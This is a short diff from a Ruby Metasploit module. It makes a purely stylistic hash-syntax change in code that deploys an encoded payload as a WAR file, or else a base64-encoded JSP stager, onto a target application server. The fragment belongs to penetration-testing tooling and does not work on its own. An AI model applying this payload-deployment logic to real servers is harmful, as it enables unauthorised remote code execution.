@@ -51,17 +51,17 @@ class Metasploit3 < Msf::Auxiliary
     if http_verb == 'POST'
       print_status("#{peer} - Deploying payload...")
       opts = {
-        :file => "#{app_base}.war",
-        :contents => encoded_payload
+        file: "#{app_base}.war",
+        contents: encoded_payload
       }
     else
       print_status("#{peer} - Deploying stager...")
       stager_name = Rex::Text.rand_text_alpha(8 + rand(8))
       stager_contents = stager_jsp(app_base)
       opts = {
-        :dir => "#{stager_name}.war",
-        :file => "#{stager_name}.war/#{stager_name}.jsp",
-        :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
+        dir: "#{stager_name}.war",
+        file: "#{stager_name}.war/#{stager_name}.jsp",
+        contents: Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
       }
     end
 
